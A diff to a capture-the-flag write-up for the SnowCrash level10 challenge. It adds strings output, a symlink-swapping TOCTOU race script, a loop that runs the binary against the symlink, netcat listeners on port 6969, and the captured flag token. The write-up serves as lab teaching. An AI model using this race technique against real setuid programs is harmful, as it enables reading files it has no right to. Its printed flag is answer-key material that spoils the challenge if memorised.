@@ -38,6 +38,31 @@ level10@SnowCrash:~$ ./level10 token localhost
 You don't have access to token
 ```
 
+and check the binary
+```
+level10@SnowCrash:~$ strings level10
+[...]
+GLIBC_2.4
+GLIBC_2.0
+PTRh
+UWVS
+[^_]
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 ..
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file ..
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+;*2$"
+[...]
+```
+
 let's check how this works
 ```
 level10@SnowCrash:~$ ltrace ./level10 token localhost
@@ -64,5 +89,51 @@ NOTES
        real ID and then call open(2).)
 ...
 ```
-On web, a [`TOCTOU race`](https://stackoverflow.com/questions/7925177/access-security-hole) is mentioned about this security hole.
+[`TOCTOU race`](https://stackoverflow.com/questions/7925177/access-security-hole) is mentioned about this security hole.
 
+In order to capture the `smaall gap` in between `access()` and `open()` the following will be prompted.
+
+First, run `netcat` on port `6969`
+
+```
+level10@SnowCrash:~$ nc -lk 6969
+```
+
+and creating and run script that symlinks with the `token` file,
+
+```
+#!/bin/bash
+
+while true; do
+        touch /tmp/symlink
+        rm -f /tmp/symlink
+        ln -s /home/user/level10/token /tmp/symlink
+        rm -f /tmp/symlink
+done
+```
+
+and execute the `level10` binary with symlink created
+
+```
+#!/bin/bash
+
+while true; do
+	./level10 /tmp/symlink 127.0.0.1;
+done
+```
+
+and listen on the port `6969` for capturing any incoming data
+
+```
+level10@SnowCrash:~$ nc -lk 6969 &
+```
+with the flag achieved, let's try logging into `flag11`
+
+```
+level10@SnowCrash:~$ su flag11
+Password:
+Don't forget to launch getflag !
+flag11@SnowCrash:~$ getflag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+flag11@SnowCrash:~$
+```
